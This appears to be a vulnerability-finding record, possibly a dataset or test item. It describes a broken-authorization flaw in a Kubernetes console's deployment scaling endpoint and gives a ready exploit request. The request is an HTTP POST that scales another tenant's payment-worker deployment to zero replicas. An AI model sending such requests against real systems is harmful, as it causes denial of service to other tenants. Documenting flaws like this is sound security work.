diagnosis: The Kubernetes deployment scaling endpoint patches replica counts for deployment_name in namespace. It does not check whether current_user has access rights to the specified namespace. An authenticated developer can scale deployments in any other tenant's namespace to 0 (causing denial of service) or scale to excessive numbers (causing resource exhaustion).
exploit_request:
POST /k8s/namespaces/customer-acme-prod/deployments/payment-worker/scale HTTP/1.1
Host: k8s-console.infra.net
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"replicas": 0}
